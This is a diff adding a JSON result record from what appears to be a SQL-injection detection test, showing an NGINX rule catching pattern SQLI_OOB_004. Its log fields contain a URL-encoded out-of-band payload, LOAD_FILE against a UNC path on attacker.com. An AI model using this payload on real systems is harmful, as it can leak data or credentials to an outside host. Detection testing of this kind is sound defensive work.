@@ -1,0 +1,17 @@
+{
+  "pattern_id": "SQLI_OOB_004",
+  "test_id": "SQLI_OOB_004-1772192209212-r8ppow",
+  "category": "sqli",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 28000,
+  "evidence": "11:36:49.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_OOB_004-1772192209212-r8ppow pattern_id=SQLI_OOB_004 uri=/?q=LOAD_FILE%28%27%5C%5Cattacker.com%5C%5Ca%27%29 client=127.0.0.1 method=GET",
+  "rule_name": "[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_OOB_004-1772192209212-r8ppow pattern_id=SQLI_OOB_004 uri=/?q=LOAD_FILE%28%27%5C%5Cattacker.com%5C%5Ca%27%29 client=127.0.0.1 method=GET",
+  "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt",
+  "rule_id": "",
+  "rule_match": true,
+  "matched_rule": "[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_OOB_004-1772192209212-r8ppow pattern_id=SQLI_OOB_004 uri=/?q=LOAD_FILE%28%27%5C%5Cattacker.com%5C%5Ca%27%29 client=127.0.0.1 method=GET",
+  "sent_at": 1772192237000,
+  "detected_at": 1772192209000,
+  "status": "passed"
+}
